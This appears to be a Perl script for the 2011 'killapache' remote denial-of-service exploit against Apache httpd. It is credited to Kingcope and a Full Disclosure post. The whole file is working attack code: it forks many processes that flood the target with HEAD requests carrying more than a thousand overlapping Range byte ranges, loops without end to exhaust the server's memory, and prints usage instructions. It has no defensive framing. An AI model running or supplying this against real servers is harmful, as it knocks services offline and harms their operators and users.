# From http://seclists.org/fulldisclosure/2011/Aug/175
#Apache httpd Remote Denial of Service (memory exhaustion)
#By Kingcope
#Year 2011
#
# Will result in swapping memory to filesystem on the remote side
# plus killing of processes when running out of swap space.
# Remote System becomes unstable.
#

use strict;
use warnings;

use IO::Socket;
use Parallel::ForkManager;

MAIN: {
    if ( @ARGV < 0 ) {
        usage();
        exit;
    }

    my $host   = shift or usage() && exit;
    my $port   = shift || 80;
    my $nforks = shift || 50;

    my $path = '/';

    my $vulnerable = testapache( $host, $port, $path );
    if ( !$vulnerable ) {
        print "Host does not seem vulnerable\n";
        exit;
    }

    while ( 1 ) {
        killapache( $host, $port, $path, $nforks );
    }
}

sub usage {
    print "Apache Remote Denial of Service (memory exhaustion)\n";
    print "by Kingcope\n";
    print "usage: perl killapache.pl <host> [port] [numforks]\n";
    print "example: perl killapache.pl www.example.com 8080 100\n";
}

sub killapache {
    my $host   = shift;
    my $port   = shift;
    my $path   = shift;
    my $nforks = shift;

    print "ATTACKING $host on port $port [using $nforks forks]\n";

    my $pm = new Parallel::ForkManager( $nforks );

    $|=1;
    srand(time());

    my $nranges = 1310;
    my $ranges = join( ',', map { "5-$_" } 7..$nranges );

    for ( 1..$nforks ) {
        my $pid = $pm->start and next;

        my $sock = open_socket( $host, $port );

        my $req = "HEAD $path HTTP/1.1\r\nHost: $host\r\nRange: bytes=0-,$ranges\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n";
        print $sock $req;

        while ( my $response = <$sock> ) {
        }
        $pm->finish;
    }
    $pm->wait_all_children;
    print ":pPpPpppPpPPppPpppPp\n";
}

sub testapache {
    my $host = shift;
    my $port = shift;
    my $path = shift;

    my $sock = open_socket( $host, $port );

    my $req = "HEAD $path HTTP/1.1\r\nHost: $host\r\nRange: bytes=0-\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n";
    print $sock $req;

    my $res = <$sock>;
    if ($res =~ /Partial/) { # XXX This is checking for mod_deflate, which is NOT necessary
        print "$host:$port seems vulnerable\n";
        return 1;
    }
    else {
        return 0;
    }
}

sub open_socket {
    my $host = shift;
    my $port = shift;

    my $sock = IO::Socket::INET->new(
        PeerAddr => $host,
        PeerPort => $port,
        Proto    => 'tcp'
    ) or die "Unable to connect to $host on port $port\n";

    return $sock;
}
